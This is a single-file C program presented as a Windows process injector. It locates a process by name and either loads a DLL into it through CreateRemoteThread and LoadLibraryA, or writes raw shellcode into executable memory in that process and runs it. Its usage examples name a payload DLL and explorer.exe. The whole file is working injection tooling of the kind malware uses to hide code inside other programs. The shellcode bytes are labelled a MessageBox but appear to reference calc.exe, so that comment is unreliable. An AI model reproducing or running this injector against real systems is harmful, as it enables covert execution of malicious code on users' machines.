// Single-file Process Injector for Windows - Compile with MinGW
// i686-w64-mingw32-gcc -O3 -s -static process_injector.c -o injector32.exe
// x86_64-w64-mingw32-gcc -O3 -s -static process_injector.c -o injector64.exe

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

// Find process by name
DWORD FindProcessId(const char* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD result = 0;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }
    
    do {
        if (!_stricmp(pe32.szExeFile, processName)) {
            result = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
    return result;
}

// Inject DLL into process
BOOL InjectDLL(DWORD processId, const char* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL result = FALSE;
    
    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }
    
    // Allocate memory in target process
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        printf("[-] Failed to allocate memory: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath, strlen(dllPath) + 1, NULL)) {
        printf("[-] Failed to write memory: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Get LoadLibraryA address
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        printf("[-] Failed to get LoadLibraryA address\n");
        goto cleanup;
    }
    
    // Create remote thread to load DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                (LPTHREAD_START_ROUTINE)pLoadLibraryA, 
                                pRemoteBuf, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);
    result = TRUE;
    printf("[+] DLL injected successfully!\n");
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (pRemoteBuf) VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);
    
    return result;
}

// Inject shellcode into process
BOOL InjectShellcode(DWORD processId, const unsigned char* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL result = FALSE;
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return FALSE;
    
    // Allocate executable memory
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, shellcodeSize, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuf) goto cleanup;
    
    // Write shellcode
    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode, shellcodeSize, NULL)) 
        goto cleanup;
    
    // Execute shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                (LPTHREAD_START_ROUTINE)pRemoteBuf, 
                                NULL, 0, NULL);
    if (!hThread) goto cleanup;
    
    WaitForSingleObject(hThread, INFINITE);
    result = TRUE;
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    
    return result;
}

int main(int argc, char* argv[]) {
    printf("=== Process Injector v1.0 ===\n\n");
    
    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path|shellcode>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\payload.dll\n", argv[0]);
        printf("Example: %s explorer.exe -shellcode\n", argv[0]);
        return 1;
    }
    
    DWORD pid = FindProcessId(argv[1]);
    if (!pid) {
        printf("[-] Process '%s' not found\n", argv[1]);
        return 1;
    }
    
    printf("[+] Found process: %s (PID: %lu)\n", argv[1], pid);
    
    if (strcmp(argv[2], "-shellcode") == 0) {
        // Example shellcode - Windows MessageBox
        unsigned char shellcode[] = 
            "\x31\xc0\x50\x68\x2e\x65\x78\x65"
            "\x68\x63\x61\x6c\x63\x54\x53\x50"
            "\x50\x40\x50\x40\x50\x53\x50\x50"
            "\x68\x72\x65\x00\x00\x68\x41\x41"
            "\x41\x41\x54\x5d\x48\x8d\x85\x1a"
            "\x00\x00\x00\x50\x48\x31\xc9\x48"
            "\x31\xd2\x4d\x31\xc0\x4d\x31\xc9"
            "\xff\xd5";
            
        if (InjectShellcode(pid, shellcode, sizeof(shellcode))) {
            printf("[+] Shellcode injection successful!\n");
        }
    } else {
        if (InjectDLL(pid, argv[2])) {
            printf("[+] DLL injection successful!\n");
        }
    }
    
    return 0;
}